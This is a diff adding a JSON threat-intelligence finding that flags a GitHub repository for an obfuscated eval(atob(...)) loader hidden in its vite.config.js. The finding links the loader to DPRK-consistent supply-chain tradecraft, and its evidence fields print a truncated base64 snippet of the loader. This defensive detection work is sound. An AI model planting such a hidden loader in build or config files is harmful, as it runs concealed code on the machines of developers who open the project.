@@ -1,0 +1,68 @@
+{
+  "finding": {
+    "key": "repository:usmanaliashraf/rag-bot-uet-science-society",
+    "kind": "repository",
+    "family": "",
+    "id": "usmanaliashraf/rag-bot-uet-science-society",
+    "url": "https://github.com/UsmanAliAshraf/RAG-BOT-UET-SCIENCE-SOCIETY",
+    "registry": "github",
+    "owner": "usmanaliashraf",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob",
+    "evidence_locations": "frontend/vite.config.js:10",
+    "c2_hosts": "",
+    "iocs": "frontend/vite.config.js",
+    "matched_signatures": "",
+    "reasons": "repository under owner UsmanAliAshraf of a known-malicious repo | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "f36bd73b-b957-4f11-8129-cce313c3bf64",
+    "first_seen": "hunt-20260620T053126Z",
+    "last_seen": "hunt-20260620T053126Z",
+    "evidence_file": "repositories/usmanaliashraf_rag-bot-uet-science-society.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "frontend/vite.config.js",
+      "line": 10,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "});eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-90IGg7aisrKXt2YXIgcz1"
+    },
+    {
+      "file": "frontend/vite.config.js",
+      "line": 10,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "});eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-90IGg7aisrKXt2YXIgcz1"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/usmanaliashraf/rag-bot-uet-science-society",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in frontend/vite.config.js.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: frontend/vite.config.js\n- frontend/vite.config.js:10: decodes a hidden blob and executes it at load time (obfuscated loader)\n- frontend/vite.config.js:10: hides code in an encoded blob that is decoded and run",
+    "publisher": "usmanaliashraf",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/usmanaliashraf/rag-bot-uet-science-society/blob/HEAD/frontend/vite.config.js#L10",
+    "verified_iocs": "frontend/vite.config.js",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:31:26Z",
+    "last_seen": "2026-06-20T05:31:26Z"
+  }
+}
